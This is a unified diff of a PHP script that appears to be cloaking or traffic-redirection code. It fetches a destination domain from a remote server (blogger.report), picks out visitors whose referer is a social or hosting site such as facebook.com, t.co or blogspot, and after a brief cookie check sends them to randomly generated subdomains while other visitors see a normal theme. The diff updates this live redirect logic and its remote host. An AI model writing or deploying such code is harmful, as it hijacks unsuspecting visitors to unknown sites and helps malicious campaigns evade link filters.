@@ -30,7 +30,7 @@
 
   function getSite(){
     $ch = curl_init();
-  	curl_setopt($ch, CURLOPT_URL, 'http://asdksakdaskdsad.com/php/site.php');
+  	curl_setopt($ch, CURLOPT_URL, 'http://blogger.report/php/site.php');
   	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
   	$site = curl_exec($ch);
   	curl_close($ch);
@@ -62,7 +62,7 @@
 
   if($action == 'site'){
     $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
-    $refs = array('facebook.com', 'futunga.com', 'googleapis.com', 'blogspot.', 't.co', 'googleusercontent.com', 'herokuapp.com');
+    $refs = array('facebook.com', 'uye.io', 'googleapis.com', 'blogspot.', 't.co', 'googleusercontent.com', 'herokuapp.com');
     $action = 'theme';
     foreach ($refs as $ref) {
       if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
@@ -119,7 +119,8 @@
     
   }else if($action == 'site'){
     if(isset($_COOKIE["trust"])){
-    	header("Location: http://".getSite()."/".$id);
+      $app_site = getSite();
+    	header("Location: http://".generate_name(rand(5,9)).".$app_site/$id");
     }else{
     	setcookie("trust", "true", (time() + 10), "/", ".".$_SERVER["HTTP_HOST"], false);
       header('Location:http://'.$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]);
